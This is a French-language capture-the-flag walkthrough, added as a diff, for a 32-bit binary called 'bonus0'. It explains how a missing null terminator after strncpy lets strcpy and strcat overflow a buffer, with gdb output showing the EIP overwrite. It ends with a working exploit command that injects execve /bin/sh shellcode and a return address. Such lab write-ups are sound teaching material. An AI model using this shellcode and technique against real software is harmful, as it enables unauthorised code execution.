@@ -1,0 +1,28 @@
+Ce programe effectue 2 read sur l'entré standard remplace le \n par un \0. Il copie ensuite les 20 premiers octets dans un array.
+Ensuite, il copie le premier array dans un buffer puis ecrit un espace a la fin, avant de le concatener avec le deuxieme array avec un strcat.
+Il affiche ensuite le resultat avec un puts.
+
+On se rend compte rapidement que si l'on ecrit plus de 20 caracteres dans le premier read, le premier array ne contiendra pas de \0 (en effet, il se situe apres 20 caracteres et le strncpy ne copie que les 20 premiers).
+Donc quand le programe va copier le contenue du premier array dans le buffer avec strcpy, il va aussi copier le contenue du deuxieme array, comme on peut le voir sous gdb: 
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -
+BBB
+(gdb) x/8x 0xbffff6f6
+0xbffff6f6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff706:	0x41414141	0x00424242	0xd280b7e5	0x0000b7fe
+
+On voit 3 octets a 0x42 alors que nous n'avons pas encore concatené le deuxieme array. Nous allons nous en servir pour faire overflow le buffer et ecraser l'eip. 
+Etant donné que les deux array ont une taille de 20 octets, nous allons utiliser le buffer de read. Aussi, comme la deuxieme irration de read va ecraser une partie du buffer, nous allons le placer a 20 octets du debut.
+
+En tatonnant un peu avec les donnés du deuxieme array, on arrive a faire crash le programe :
+Program received signal SIGSEGV, Segmentation fault.
+0x44444444 in ?? ()
+
+Pour ce faire, on a rentré "BBBBBBBBBBBBBBDDDDB" dans le deuxieme read. En remplacant DDDD par l'adresse du buffer de read + 20, on est capable d'executer le shellcode.
+
+(python -c 'print "A" * 20 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; python -c 'print "B" * 14 + "\xbf\xff\xe6\xa4"[::-1] + "B"'; cat) | ./bonus0
+
+
